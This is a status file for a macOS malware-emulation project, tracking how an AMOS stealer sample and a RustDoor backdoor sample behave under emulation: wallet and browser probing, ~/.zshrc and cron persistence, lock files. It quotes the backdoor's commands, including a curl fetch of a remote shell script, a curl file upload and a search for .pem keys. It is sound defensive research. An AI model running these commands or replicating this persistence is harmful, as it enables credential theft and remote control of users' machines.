# Sample Status

This file tracks the current state of the local sample corpus as it relates to
emulator behavior.

## `arm64_hello`

- Path: [fixtures/macos/bin/arm64_hello](D:/dev/quiling/qiling/fixtures/macos/bin/arm64_hello)
- Role: smoke-test fixture
- Expected status: should execute successfully
- Current note: used as the primary quick validation sample for `cargo build --bin machina` and basic runtime checks

## `2d0dda75bfc90e7ffda72640eb32c7ff9f51c90c30f4a6d1e05df93e58848f36.macho`

- Path: [fixtures/macos/bin/2d0dda75bfc90e7ffda72640eb32c7ff9f51c90c30f4a6d1e05df93e58848f36.macho](D:/dev/quiling/qiling/fixtures/macos/bin/2d0dda75bfc90e7ffda72640eb32c7ff9f51c90c30f4a6d1e05df93e58848f36.macho)
- Family: AMOS stealer
- Architecture: arm64
- Current observed status:
  - probes browser and wallet paths
  - probes browser profile roots such as Chrome, Brave, Edge, and Firefox
  - attempts to open wallet/private data such as Binance, Electrum, Coinomi, and Exodus paths
  - reads synthetic fallback content from guest filesystem policy
  - CI regression guard verifies these milestones from JSONL trace output on Ubuntu
- Important implication:
  - emulator is already past bootstrap/runtime-only execution and into real stealer logic
  - next compatibility work should focus on richer profile traversal and artifact semantics rather than simple `ENOENT` fixes

## `0393e898f4425195d780346634e619b80f283a8223b9724db56dee87afbba486.macho`

- Path: [fixtures/macos/bin/0393e898f4425195d780346634e619b80f283a8223b9724db56dee87afbba486.macho](D:/dev/quiling/qiling/fixtures/macos/bin/0393e898f4425195d780346634e619b80f283a8223b9724db56dee87afbba486.macho)
- Current observed status:
  - retained as a large arm64 analysis target
- Important implication:
  - this sample is both an execution target and a reverse-engineering reference set

## `rustdoor/76f96a35b6f638eed779dc127f29a5b537ffc3bb7accc2c9bfab5a2120ea6bc9.macho`

- Path: [fixtures/macos/bin/rustdoor/76f96a35b6f638eed779dc127f29a5b537ffc3bb7accc2c9bfab5a2120ea6bc9.macho](D:/dev/quiling/qiling/fixtures/macos/bin/rustdoor/76f96a35b6f638eed779dc127f29a5b537ffc3bb7accc2c9bfab5a2120ea6bc9.macho)
- Family: RustDoor
- Architecture: arm64
- Current observed status:
  - parses, maps, and loads Foundation/AppKit/CoreFoundation/Security/libobjc dependencies
  - reaches real runtime/import activity instead of stopping at initial unresolved bindings
  - exercises TLV bootstrap, signal/bootstrap imports, heap growth, `memcmp`, `memmove`, `memcpy`, `malloc`, `realloc`, and `free`
  - now synthetically handles arm64 LSE `ldadd`, `ldapr`, and `cas` runtime atomics that previously consumed the execution budget
  - resolves bootstrap environment lookups such as `getenv("HOME")` from the synthetic guest envp
  - resolves high/tagged literal pointers in libc memory imports, including the path build for `/Users/analyst/.docks`
  - uses chunked synthetic heap mapping so Rust runtime allocation churn no longer exhausts Unicorn memory sections
  - records `posix_spawnp` for `log stream --predicate ... restartInitiated/shutdownInitiated ... --info` and can feed synthetic matching log events into the redirected pipe
  - treats hidden `.inj_*` marker files as absent by default, so RustDoor does not falsely assume Chrome injection already happened
  - progresses through the daemonization path (`fork`, `chdir`, `setsid`, second `fork`) and the grandchild becomes the active daemon
  - tagged-PC FETCH faults now redirect PC to the canonical address, so execution no longer accumulates additional tagged pages for each `bl`/`adrp` from a tagged page
  - the daemon-singleton check on `/tmp/com.apple.lock` now reports `ENOENT`, so the freshly emulated daemon "wins" the lock instead of immediately exiting on the assumption another daemon is already present
  - the LSE atomic hook now also handles `SWP[A][L]` and the rest of the `LDADD`/`LDCLR`/`LDEOR`/`LDSET`/`LDSMAX`/`LDSMIN`/`LDUMAX`/`LDUMIN` family, not just `CAS`/`LDADD`/`LDAPR`. The OnceLock release `SWPAL x8, x8, [x19]` at `0x10018242C` previously hung because Unicorn did not advance PC for it; with the explicit emulator that path now completes (transitioning `0x10026D450`/`0x10026D1D8` from `RUNNING` (2) to `COMPLETE` (3) so the init trampoline returns instead of looping).
  - the synthetic `_waitpid` import now reports `ECHILD` for `WNOHANG` polls when no reapable child is left, mirroring `_wait4`. Without that, the post-OnceLock daemon spun forever in `waitpid(-1, &status, WNOHANG) == 0`.
  - the `_exit` libc symbol is now hooked in addition to the BSD `__exit` syscall wrapper, so the daemon's clean shutdown actually terminates instead of falling through to the generic zero-return stub
  - the `done_addr` cleanup hook now honors `stop_now` even when an `exited_pid` is also reported — the previous `else if` chain meant the runner kept running the dead caller's tail after the daemon exit
  - off-canvas data pages (e.g. `0xA00000000`) are now synthesized for tagged data writes that fall outside the canonical heap/mmap arena, so the post-`waitpid` `WaitStatus` store at `[x19, #8]` (which packs an enum discriminant into bits 32–35) succeeds
  - the parent process (`PID=1`, after the daemon detached) now reaches Chrome-injection probing:
    - `_stat /Applications/Google Chrome.app/Contents/MacOS/Google Chrome` (Chrome detection)
    - `_stat /Users/analyst/.docks/.inj_rc_chr` → `ENOENT` (Chrome rc-injection marker)
    - `_stat /Users/analyst/.docks/.inj_launch_chr` → `ENOENT` (Chrome launch-injection marker)
  - daemon child PID=3 now runs all the way through its persistence path and reaches the **first malware-interesting `posix_spawnp`** from the article:
    - opens `~/.zshrc`, reads it in 32→2048-byte windows, then re-opens it `read_write` and writes injected lines for shell-startup persistence (the literal payload — initially `\n\n`, more after the spawn returns — is dumped to `target/machina-captures/file_pid<pid>_fd<fd>_<sanitized>.bin`)
    - opens `~/.docks/cron` and `/tmp/com.apple.lock.<timestamp>` for cron-style and lock persistence
    - `_stat`s the `~/.local` and `~/.zshrc` parents during persistence prep
    - then `posix_spawnp("log", ["log", "stream", "--predicate", "eventMessage contains \"com.apple.restartInitiated\" or eventMessage contains \"com.apple.shutdownInitiated\"", "--info"])` — exactly the shutdown-monitor command from Unit42's Table 1
  - the per-instance `/tmp/com.apple.lock.<timestamp>` marker now reports `ENOENT` like the bare `/tmp/com.apple.lock`, so the daemon doesn't conclude "another instance already installed me" and exit early; combined with `O_CREAT` honoring (see below) it actually creates the lock and proceeds to spawn the log-stream watcher.
  - the open path now honors `O_CREAT` (Darwin `0x200`) for paths the materialization policy normally suppresses. Without that, the malware's "open RDONLY → ENOENT, retry as `O_RDWR|O_CREAT|O_TRUNC`" lock-creation pattern looped back to `ENOENT` on the second open and the daemon panicked instead of moving past the lock check.
  - file writes to synthetic guest fds are now appended to `target/machina-captures/file_pid<pid>_fd<fd>_<sanitized_path>.bin`, configurable via `MACHINA_PAYLOAD_DUMP_DIR`, so analysts can inspect the actual payload bytes (e.g. the `~/.zshrc` injection) instead of just a 128-byte preview.
  - the immediate post-daemon blocker observed under the legacy 10M-instruction budget was `instruction_budget_exhausted` deep inside the parent's Rust `OnceLock`/init trampoline at the `cas64` → `blr` pattern around `0x100182424` / `0x10018242C`; with the SWP/`_exit`/`done_addr` fixes that path now completes well within the default profile
  - **current next blocker:** after the `log stream` spawn returns the daemon spins up a worker pthread (TID=4), runs through `pthread_get_stack*_np` / `__tlv_bootstrap` / `__tlv_atexit` / `sigaltstack`, and then hits a guest-side `brk #0x1` panic at `0x10000AE00` (`Lr=0x1000094DC`, `Sp` on the worker's synthetic stack). Disassembly shows two `b 0x10000AE00` callers in the binary: `0x100009970` (preceded by `mov x19, x0; cbnz x0, +16`) and `0x10000A824` (preceded by `cbz x9, ...; cmp x16, x22; b.eq ...`). Both are unwrap-style "result must not be null/equal" checks, so the worker is calling some init / table-lookup function that returns `0` or a sentinel where the daemon expected a real value. The remaining article commands (`chflags hidden npm`, `chmod +x npm`, `zsh -c zip -r ...`, `zsh -c curl -F file=...`, `zsh -c curl -O https://apple-ads-metric.com/back.sh`, `zsh -c mdfind -name .pem`) sit downstream of resolving that. Stack-size mismatch is *not* the cause — bumping the synthetic thread stack from 128 KiB to 2 MiB hits the same panic at the same `Lr`. An opt-in `MACHINA_SKIP_BRK_AT` step-over experiment also confirms the panic is genuine: stepping past the brk diverges into `PC=0` / non-executable memory rather than resuming a viable code path.
- Important implication:
  - the in-process bootstrap/runtime/daemonization compatibility blockers are resolved and the emulator now reaches the first article-listed `posix_spawnp` command (`log stream --predicate ... restartInitiated/shutdownInitiated --info`)
  - the next compatibility work for this family is the worker-thread `brk #0x1` at `0x10000AE00` — likely a Rust runtime check that fails with our synthetic TLV / `sigaltstack` setup. Resolving it should unlock the remaining `posix_spawnp` calls (chflags / chmod / curl / zip / mdfind / reverse-shell).
- Recommended local invocation:
  - `MACHINA_PROFILE=long .\target\debug\machina.exe fixtures\macos\bin\rustdoor\76f96a35b6f638eed779dc127f29a5b537ffc3bb7accc2c9bfab5a2120ea6bc9.macho > rustdoor-trace-long.jsonl`

## Corpus hygiene

- New samples should be added with a short status note here.
